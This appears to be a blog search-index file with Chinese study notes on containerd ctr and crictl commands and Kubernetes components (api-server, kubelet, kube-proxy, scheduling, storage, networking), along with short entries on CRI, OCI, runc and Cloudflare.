后台运行 ctr run -d docker.io/kentxxq/test-server:latest tt 容器 container # c,container,containers都可以 # 查看容器 ctr container ls # 创建容器,但是没有启动.需要下面的任务task ctr c create docker.io/kentxxq/test-server:latest test-server # 容器详情 ctr c info test-server # 删除容器 ctr c rm test-server 任务 task # t,task都可以 # 启动容器 ctr t start -d test-server # 查看运行容的容器 ctr t ls # 进入容器,需要 --exec-id 任意唯一id ctr t exec --exec-id 0 -t test-server /bin/bash # 暂停 ctr t pause test-server # 恢复 ctr t resume test-server # kill ctr t kill test-server # 删除 ctr t rm test-server # 查看容器限制 ctr task metrics test-server # 查看容器在主机的进程名 ctr task ps test-server PID INFO 52022 - # 我们接着用 ps -ef|grep 52022 # 发现 52022 52004 dotnet TestServer.dll # 接着 ps -ef|grep 52004 # 发现 52004 containerd-shim-runc-v2 -namespace default -id test-server -address /run/containerd/containerd.sock ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#ctr-操作"},{"categories":["blog"],"content":" ctr 操作 命名空间 namespace 默认是 default 命名空间 , ctr image ls -n default Containerd 默认命名空间 default docker 默认命名空间 moby. 如果找不到容器, 修改 docker 的启动命令后重启再试. /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock =\u003e /usr/bin/dockerd --containerd /run/containerd/containerd.sock k8s 默认命名空间 k8s.io # 列出所有命名空间 ctr ns ls # 创建 ctr ns create test # 删除 ctr ns rm test 镜像 image # i,image,images都可以 # 镜像查看 ctr i ls # 镜像拉取,带上docker.io ctr i pull docker.io/kentxxq/test-server:latest # 镜像tag ctr i tag docker.io/kentxxq/test-server:latest xx/oo:latest # 删除镜像 ctr i rm # 导出镜像 ctr i export kentxxq.tar.gz docker.io/kentxxq/test-server:latest # 导入镜像 ctr i import kentxxq.tar.gz # 把容器的内容挂载到主机的/xxoo下面 ctr image mount docker.io/library/nginx:alpine /xxoo # 卸载目录 ctr image unmount /xxoo 运行 run # 前台运行 ctr run --rm docker.io/kentxxq/test-server:latest tt # 后台运行 ctr run -d docker.io/kentxxq/test-server:latest tt 容器 container # c,container,containers都可以 # 查看容器 ctr container ls # 创建容器,但是没有启动.需要下面的任务task ctr c create docker.io/kentxxq/test-server:latest test-server # 容器详情 ctr c info test-server # 删除容器 ctr c rm test-server 任务 task # t,task都可以 # 启动容器 ctr t start -d test-server # 查看运行容的容器 ctr t ls # 进入容器,需要 --exec-id 任意唯一id ctr t exec --exec-id 0 -t test-server /bin/bash # 暂停 ctr t pause test-server # 恢复 ctr t resume test-server # kill ctr t kill test-server # 删除 ctr t rm test-server # 查看容器限制 ctr task metrics test-server # 查看容器在主机的进程名 ctr task ps test-server PID INFO 52022 - # 我们接着用 ps -ef|grep 52022 # 发现 52022 52004 dotnet TestServer.dll # 接着 ps -ef|grep 52004 # 发现 52004 containerd-shim-runc-v2 -namespace default -id test-server -address /run/containerd/containerd.sock ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#命名空间-namespace"},{"categories":["blog"],"content":" ctr 操作 命名空间 namespace 默认是 default 命名空间 , ctr image ls -n default Containerd 默认命名空间 default docker 默认命名空间 moby. 如果找不到容器, 修改 docker 的启动命令后重启再试. /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock =\u003e /usr/bin/dockerd --containerd /run/containerd/containerd.sock k8s 默认命名空间 k8s.io # 列出所有命名空间 ctr ns ls # 创建 ctr ns create test # 删除 ctr ns rm test 镜像 image # i,image,images都可以 # 镜像查看 ctr i ls # 镜像拉取,带上docker.io ctr i pull docker.io/kentxxq/test-server:latest # 镜像tag ctr i tag docker.io/kentxxq/test-server:latest xx/oo:latest # 删除镜像 ctr i rm # 导出镜像 ctr i export kentxxq.tar.gz docker.io/kentxxq/test-server:latest # 导入镜像 ctr i import kentxxq.tar.gz # 把容器的内容挂载到主机的/xxoo下面 ctr image mount docker.io/library/nginx:alpine /xxoo # 卸载目录 ctr image unmount /xxoo 运行 run # 前台运行 ctr run --rm docker.io/kentxxq/test-server:latest tt # 后台运行 ctr run -d docker.io/kentxxq/test-server:latest tt 容器 container # c,container,containers都可以 # 查看容器 ctr container ls # 创建容器,但是没有启动.需要下面的任务task ctr c create docker.io/kentxxq/test-server:latest test-server # 容器详情 ctr c info test-server # 删除容器 ctr c rm test-server 任务 task # t,task都可以 # 启动容器 ctr t start -d test-server # 查看运行容的容器 ctr t ls # 进入容器,需要 --exec-id 任意唯一id ctr t exec --exec-id 0 -t test-server /bin/bash # 暂停 ctr t pause test-server # 恢复 ctr t resume test-server # kill ctr t kill test-server # 删除 ctr t rm test-server # 查看容器限制 ctr task metrics test-server # 查看容器在主机的进程名 ctr task ps test-server PID INFO 52022 - # 我们接着用 ps -ef|grep 52022 # 发现 52022 52004 dotnet TestServer.dll # 接着 ps -ef|grep 52004 # 发现 52004 containerd-shim-runc-v2 -namespace default -id test-server -address /run/containerd/containerd.sock ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#镜像-image"},{"categories":["blog"],"content":" ctr 操作 命名空间 namespace 默认是 default 命名空间 , ctr image ls -n default Containerd 默认命名空间 default docker 默认命名空间 moby. 如果找不到容器, 修改 docker 的启动命令后重启再试. /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock =\u003e /usr/bin/dockerd --containerd /run/containerd/containerd.sock k8s 默认命名空间 k8s.io # 列出所有命名空间 ctr ns ls # 创建 ctr ns create test # 删除 ctr ns rm test 镜像 image # i,image,images都可以 # 镜像查看 ctr i ls # 镜像拉取,带上docker.io ctr i pull docker.io/kentxxq/test-server:latest # 镜像tag ctr i tag docker.io/kentxxq/test-server:latest xx/oo:latest # 删除镜像 ctr i rm # 导出镜像 ctr i export kentxxq.tar.gz docker.io/kentxxq/test-server:latest # 导入镜像 ctr i import kentxxq.tar.gz # 把容器的内容挂载到主机的/xxoo下面 ctr image mount docker.io/library/nginx:alpine /xxoo # 卸载目录 ctr image unmount /xxoo 运行 run # 前台运行 ctr run --rm docker.io/kentxxq/test-server:latest tt # 后台运行 ctr run -d docker.io/kentxxq/test-server:latest tt 容器 container # c,container,containers都可以 # 查看容器 ctr container ls # 创建容器,但是没有启动.需要下面的任务task ctr c create docker.io/kentxxq/test-server:latest test-server # 容器详情 ctr c info test-server # 删除容器 ctr c rm test-server 任务 task # t,task都可以 # 启动容器 ctr t start -d test-server # 查看运行容的容器 ctr t ls # 进入容器,需要 --exec-id 任意唯一id ctr t exec --exec-id 0 -t test-server /bin/bash # 暂停 ctr t pause test-server # 恢复 ctr t resume test-server # kill ctr t kill test-server # 删除 ctr t rm test-server # 查看容器限制 ctr task metrics test-server # 查看容器在主机的进程名 ctr task ps test-server PID INFO 52022 - # 我们接着用 ps -ef|grep 52022 # 发现 52022 52004 dotnet TestServer.dll # 接着 ps -ef|grep 52004 # 发现 52004 containerd-shim-runc-v2 -namespace default -id test-server -address /run/containerd/containerd.sock ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#运行-run"},{"categories":["blog"],"content":" ctr 操作 命名空间 namespace 默认是 default 命名空间 , ctr image ls -n default Containerd 默认命名空间 default docker 默认命名空间 moby. 如果找不到容器, 修改 docker 的启动命令后重启再试. /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock =\u003e /usr/bin/dockerd --containerd /run/containerd/containerd.sock k8s 默认命名空间 k8s.io # 列出所有命名空间 ctr ns ls # 创建 ctr ns create test # 删除 ctr ns rm test 镜像 image # i,image,images都可以 # 镜像查看 ctr i ls # 镜像拉取,带上docker.io ctr i pull docker.io/kentxxq/test-server:latest # 镜像tag ctr i tag docker.io/kentxxq/test-server:latest xx/oo:latest # 删除镜像 ctr i rm # 导出镜像 ctr i export kentxxq.tar.gz docker.io/kentxxq/test-server:latest # 导入镜像 ctr i import kentxxq.tar.gz # 把容器的内容挂载到主机的/xxoo下面 ctr image mount docker.io/library/nginx:alpine /xxoo # 卸载目录 ctr image unmount /xxoo 运行 run # 前台运行 ctr run --rm docker.io/kentxxq/test-server:latest tt # 后台运行 ctr run -d docker.io/kentxxq/test-server:latest tt 容器 container # c,container,containers都可以 # 查看容器 ctr container ls # 创建容器,但是没有启动.需要下面的任务task ctr c create docker.io/kentxxq/test-server:latest test-server # 容器详情 ctr c info test-server # 删除容器 ctr c rm test-server 任务 task # t,task都可以 # 启动容器 ctr t start -d test-server # 查看运行容的容器 ctr t ls # 进入容器,需要 --exec-id 任意唯一id ctr t exec --exec-id 0 -t test-server /bin/bash # 暂停 ctr t pause test-server # 恢复 ctr t resume test-server # kill ctr t kill test-server # 删除 ctr t rm test-server # 查看容器限制 ctr task metrics test-server # 查看容器在主机的进程名 ctr task ps test-server PID INFO 52022 - # 我们接着用 ps -ef|grep 52022 # 发现 52022 52004 dotnet TestServer.dll # 接着 ps -ef|grep 52004 # 发现 52004 containerd-shim-runc-v2 -namespace default -id test-server -address /run/containerd/containerd.sock ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#容器-container"},{"categories":["blog"],"content":" ctr 操作 命名空间 namespace 默认是 default 命名空间 , ctr image ls -n default Containerd 默认命名空间 default docker 默认命名空间 moby. 如果找不到容器, 修改 docker 的启动命令后重启再试. /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock =\u003e /usr/bin/dockerd --containerd /run/containerd/containerd.sock k8s 默认命名空间 k8s.io # 列出所有命名空间 ctr ns ls # 创建 ctr ns create test # 删除 ctr ns rm test 镜像 image # i,image,images都可以 # 镜像查看 ctr i ls # 镜像拉取,带上docker.io ctr i pull docker.io/kentxxq/test-server:latest # 镜像tag ctr i tag docker.io/kentxxq/test-server:latest xx/oo:latest # 删除镜像 ctr i rm # 导出镜像 ctr i export kentxxq.tar.gz docker.io/kentxxq/test-server:latest # 导入镜像 ctr i import kentxxq.tar.gz # 把容器的内容挂载到主机的/xxoo下面 ctr image mount docker.io/library/nginx:alpine /xxoo # 卸载目录 ctr image unmount /xxoo 运行 run # 前台运行 ctr run --rm docker.io/kentxxq/test-server:latest tt # 后台运行 ctr run -d docker.io/kentxxq/test-server:latest tt 容器 container # c,container,containers都可以 # 查看容器 ctr container ls # 创建容器,但是没有启动.需要下面的任务task ctr c create docker.io/kentxxq/test-server:latest test-server # 容器详情 ctr c info test-server # 删除容器 ctr c rm test-server 任务 task # t,task都可以 # 启动容器 ctr t start -d test-server # 查看运行容的容器 ctr t ls # 进入容器,需要 --exec-id 任意唯一id ctr t exec --exec-id 0 -t test-server /bin/bash # 暂停 ctr t pause test-server # 恢复 ctr t resume test-server # kill ctr t kill test-server # 删除 ctr t rm test-server # 查看容器限制 ctr task metrics test-server # 查看容器在主机的进程名 ctr task ps test-server PID INFO 52022 - # 我们接着用 ps -ef|grep 52022 # 发现 52022 52004 dotnet TestServer.dll # 接着 ps -ef|grep 52004 # 发现 52004 containerd-shim-runc-v2 -namespace default -id test-server -address /run/containerd/containerd.sock ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#任务-task"},{"categories":["blog"],"content":" crictl 操作k8s 通过 CRI 标准操作容易运行时, crictl 就是一个 CRI 的 cli 工具. 因为容器相关的命令很难用, 并且官方只建议用来调试! 我只写一些可能用到的命令. # 镜像 # 列出镜像 crictl images # 拉取净吸纳过 crictl pull # pod # pod列表 crictl pods # 在容器执行命令 crictl exec -i -t 1f73f2d81bf98 ls # 查看日志,动态查看最新10行 crictl logs 87d3992f84f74 crictl logs --tail=10 87d3992f84f74 在配置文件 /etc/containerd/config.toml 中如果有 disabled_plugins = [\"cri\"],crictl 会因无法请求 Containerd 报错 ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:4","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#crictl-操作"},{"categories":["point"],"content":"CRI 是 容器运行时接口Container Runtime Interface 的缩写. 要点: docker, CRI-O, Containerd 等等都实现了 CRI 规范. ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/cri/:0:0","series":null,"tags":["point","CRI"],"title":"CRI","uri":"/posts/%E7%AC%94%E8%AE%B0/point/cri/#"},{"categories":["point"],"content":"OCI 是 开放容器标准Open Container Initiative 的简写. 要点: kata 和 runc 都实现这个标准. ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/oci/:0:0","series":null,"tags":["point","OCI"],"title":"OCI","uri":"/posts/%E7%AC%94%E8%AE%B0/point/oci/#"},{"categories":["point"],"content":"runc 是 OCI 的一个实现. 要点: 创建, 删除, 进入容器… Containerd 就是用的 runc,而 docker 和 k8s 都用了 Containerd,所以 runc 是事实标准. ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/runc/:0:0","series":null,"tags":["point","runc"],"title":"runc","uri":"/posts/%E7%AC%94%E8%AE%B0/point/runc/#"},{"categories":["journal"],"content":"2023-08-01 日记","date":"2023-08-01","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-01/","series":null,"tags":["journal"],"title":"2023-08-01","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-01/"},{"categories":["journal"],"content":" #fun Cloudflare 通过与运营商, 第三方云商建立对等流量, 降低成本. 中东, 欧洲, 北美价格便宜 非洲, 亚洲还行. 但是韩国, 香港, 日本不便宜 南美和澳洲都很贵 CN 地域是另外一个玩法… 有趣的是, 一些服务商例如 Telstra (澳洲电信) 不愿意和 Cloudflare 合作. 于是 Cloudflare 把服务迁出澳洲, 减少成本. 于是 Telstra 需要使用昂贵的海底光缆传输数据到澳洲以外的地区, Telstra 成本也跟着上涨了. 下面这两篇文章是他们写的流量情况介绍 Bandwidth Costs Around the World Introducing the Bandwidth Alliance: sharing the benefits of interconnected networks ","date":"2023-08-01","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-01/:0:0","series":null,"tags":["journal"],"title":"2023-08-01","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-01/#"},{"categories":["point"],"content":"Cloudflare 是一家的网络服务提供商. 要点: 提供免费 cdn 免费 ssl 证书 1.1.1.1 和 1.0.0.1 免费 dns ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/cloudflare/:0:0","series":null,"tags":["point","cloudflare"],"title":"Cloudflare","uri":"/posts/%E7%AC%94%E8%AE%B0/point/cloudflare/#"},{"categories":["blog"],"content":"[[笔记/point/k8s|k8s]] 的组件学习记录.","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/"},{"categories":["blog"],"content":" 简介k8s 的组件学习记录 主要组件如下: 容器技术 Api-server: 提供 api 接口作为主要入口 Etcd: 存储配置和状态信息 Controller Manager: 控制器, 管理 Replication,Deployment 等等 Scheduler: 调度分发应用程序 kubelet: 管理容器的启动和停止, 健康状态 kube-proxy: 每个节点上的代理,转发的实现 CoreDNS: 内部的 dns 解析 网络组件: 联通节点, 容器网络 Ingress Controller: 提供对外的入口. 承接 Http, https 流量 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:1:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#简介"},{"categories":["blog"],"content":" 容器 k8s 通过 CRI 规范来进行实际的编排操作. docker 操作 Containerd Containerd 操作符合 OCI 标准的容器运行时. 采用 runc 为默认容器运行时. 同上图: 题外话 docker 其实从 1.12 版本开始, 已经可以通过 组件方式 支持 CRI 标准. 但是 Containerd 直接集成 CRI 到了自己内部, 这样就少了 docker 和 CRI 组件两个环节. 同时 Containerd 不像 docker 属于公司, 所以 k8s 从 1.24 版本开始切换到了 Containerd. ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:2:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#容器"},{"categories":["blog"],"content":" master 节点 api-server：处理 api 操作，所有组件都通过 api-server controller：对集群状态处理。自动容器修复，水平扩展 scheduler：完成调度操作。根据用户提交的的数据，调度到指定节点 etcd：分布式存储。所有元信息存储 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:3:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#master-节点"},{"categories":["blog"],"content":" node 节点 kubelet：通过 api-server 拿到状态，调用 containner-runtime 启动容器 storage-plugin 和 network-plugin 完成对应操作 kube-proxy 服务于 service。通过 iptables 实现功能 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:4:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#node-节点"},{"categories":["blog"],"content":" api-server 传递流程 user 提交到 api-server api-server 写入到 etcd scheduler 通过 watch 到的信息，进行调度决策 scheduler 调用 api-server，说应该怎么调度 api-server 写入到 etcd kubelet 通过 watch 到的信息，调用 container-runtime 进行部署 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:5:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#api-server-传递流程"},{"categories":["blog"],"content":" kubelet 定期从所监听的数据源获取期望状态，调整自身到期望状态 容器的健康检查与健康检查策略 容器监控。向 master 提供报告信息 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:6:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#kubelet"},{"categories":["blog"],"content":" kube-proxy (iptables/IPVS)kube-proxy 监听的对象如下： service endpoint/endpointslices node kube-proxy 会监听 api-Server 的资源变化，配置 nodePort 和本地的 iptables/IPVS。pod 与 pod、外部请求与 pod 之间的通信，都会经过 iptables/IPVS。于是完成了流量转发和负载均衡。 外部 SLB 负载均衡，其实也是把请求转发给 nodePort。只不过每个 worker 节点上通过虚拟网卡，绑定了很多的 ip。这些 ip 对应着一个个 pod 实例。 因此负载均衡直接请求 worker 节点的特定网卡 ip 地址，即可请求到对应 pod。同时云商做了优化，性能比传统方式好。 在创建一个 service 后，通常会创建一个 endpoint 对象 (除了 headless，headless 是在 dns 搞了一个别名)。 client 访问 service 的时候有 2 种方式。 通过域名。也就是 coreDNS 解析出来地址 通过 ip 地址访问。这是一个虚拟的 ip 地址，请求在转发到 kube-proxy 后，通过本地的 iptables 规则转发到对应的 pod 服务拓扑就需要监听 node 信息，实现一个服务可以指定流量是被优先路由到一个和客户端在同一个 Node 或者在同一可用区域的端点。 ipvs 是 iptables 是使用了 ipset 拓展。它和默认方式否是基于 Netfilter 实现的。默认是做防火墙，而 ipvs 是做负载均衡的。 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:7:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#kube-proxy-iptablesipvs"},{"categories":["blog"],"content":" scheduler 调度","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:8:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#scheduler-调度"},{"categories":["blog"],"content":" 调度过程 提交到 api-server controller 验证以后，api-server 中变成 pending、同时 nodeName 为空 scheduler 发现这个空 nodeName 的 pod 后，开始调度算法、打分。写入 nodeName kubelet 在 watch 到以后，开始制定调度细节 最后状态为 running ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:8:1","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#调度过程"},{"categories":["blog"],"content":" QoS 调度打分 默认优先级 Guaranteed- 高保障：cpu 和 memory 的 request=limit，其他资源可不等 Burstable- 中，弹性：cpu 和 memory 的 request!=limit BestEffort- 低，尽力而为：所有资源必须都不填 调度表现: 一定先满足 request 请求 如果 –cpu-manager-policy=static，且高保障 Guaranteed。会绑核, 避免 cpu 一会儿给 a 服务使用, 一会儿切换到 b 服务. memory 会根据 QoS 级别进行打分，低优先级 BestEffort 被调走 影响调度 ResourceQuota 限制命名空间的 cpu, 内存, pods 总数 pod亲和,pod与node亲和,pod容忍污点 会影响调度 PriorityClass 可以配置在 pod 上, 默认没有启用 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:8:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#qos-调度打分"},{"categories":["blog"],"content":" QoS 调度打分 默认优先级 Guaranteed- 高保障：cpu 和 memory 的 request=limit，其他资源可不等 Burstable- 中，弹性：cpu 和 memory 的 request!=limit BestEffort- 低，尽力而为：所有资源必须都不填 调度表现: 一定先满足 request 请求 如果 –cpu-manager-policy=static，且高保障 Guaranteed。会绑核, 避免 cpu 一会儿给 a 服务使用, 一会儿切换到 b 服务. memory 会根据 QoS 级别进行打分，低优先级 BestEffort 被调走 影响调度 ResourceQuota 限制命名空间的 cpu, 内存, pods 总数 pod亲和,pod与node亲和,pod容忍污点 会影响调度 PriorityClass 可以配置在 pod 上, 默认没有启用 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:8:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#默认优先级"},{"categories":["blog"],"content":" QoS 调度打分 默认优先级 Guaranteed- 高保障：cpu 和 memory 的 request=limit，其他资源可不等 Burstable- 中，弹性：cpu 和 memory 的 request!=limit BestEffort- 低，尽力而为：所有资源必须都不填 调度表现: 一定先满足 request 请求 如果 –cpu-manager-policy=static，且高保障 Guaranteed。会绑核, 避免 cpu 一会儿给 a 服务使用, 一会儿切换到 b 服务. memory 会根据 QoS 级别进行打分，低优先级 BestEffort 被调走 影响调度 ResourceQuota 限制命名空间的 cpu, 内存, pods 总数 pod亲和,pod与node亲和,pod容忍污点 会影响调度 PriorityClass 可以配置在 pod 上, 默认没有启用 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:8:2","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#影响调度"},{"categories":["blog"],"content":" pv 和 pvc 提交创建 pvc 对象 csi-provisioner 给 watch 到，根据 pvc 中的 storage-class 和其他信息，调用 csi-plugin1。于是在云存储中创建真正的存储，于是有了 pv 对象 pv 对象被 pv-controller 观察到，于是把 pv 和 pvc 对象绑定 提交的 pod 被调度到 node，kubelet 使用通过 csi-plugin2 挂载对应的 pv 到容器，再启动容器 如果 pvc 没有使用 name, label, storage-class 等方式指定, 会启用自动匹配机制. DefaultStorageClass 将 PVC 与 PV 会自动绑定，根据 PVC 的大小、权限等进行自动匹配后绑定的。 # 查看默认的storageclass kubectl get storageclass NAME PROVISIONER RECLAIMPOLICY VOLUMEBINDINGMODE ALLOWVOLUMEEXPANSION AGE local (default) openebs.io/local Delete WaitForFirstConsumer false 558d ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:9:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#pv-和-pvc"},{"categories":["blog"],"content":" 网络安装了网络组件以后，kubectl get nodes 才回是 ready 状态 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:0","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#网络"},{"categories":["blog"],"content":" 默认地址段 podpod 网络默认地址为 10.244.0.0/16，集群节点都可以 curl ip:port 访问到. serviceservice 网络默认地址为 10.96.0.0/12 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:1","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#默认地址段"},{"categories":["blog"],"content":" 默认地址段 podpod 网络默认地址为 10.244.0.0/16，集群节点都可以 curl ip:port 访问到. serviceservice 网络默认地址为 10.96.0.0/12 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:1","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#pod"},{"categories":["blog"],"content":" 默认地址段 podpod 网络默认地址为 10.244.0.0/16，集群节点都可以 curl ip:port 访问到. serviceservice 网络默认地址为 10.96.0.0/12 ","date":"2023-08-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/:10:1","series":null,"tags":["blog","k8s"],"title":"k8s组件剖析","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%BB%84%E4%BB%B6%E5%89%96%E6%9E%90/#service"},{"categories":["blog"],"content":" 本地容器网络 网络模型docker 默认网络模型： ifconfig 命令可以看到 docker0 和 veth73abaa8 这样的 docker0 是一个二层网络设备，即网桥 通过网桥可以将 Linux 支持的不同的端口连接起来 实现类交换机多对多的通信 veth pair 虚拟以太网（Ethernet）设备 成对出现,用于解决网络命名空间之间的隔离 一端连接 Container network namespace，另一端连接 host network namespace 所有网络模型 默认 --network bridge Bridge 桥接子网络 --network host 共享宿主机网络接口 --network none 仅本机 lo 通信 --network container:c1(容器名称或容器 ID) 并不是一种类型，而是加入目标相同的网络 docker network ls 查看已有的网络模型， docker network inspect minikube 查看 minikube 网络细节 外部通信容器访问外网: 外网访问容器: 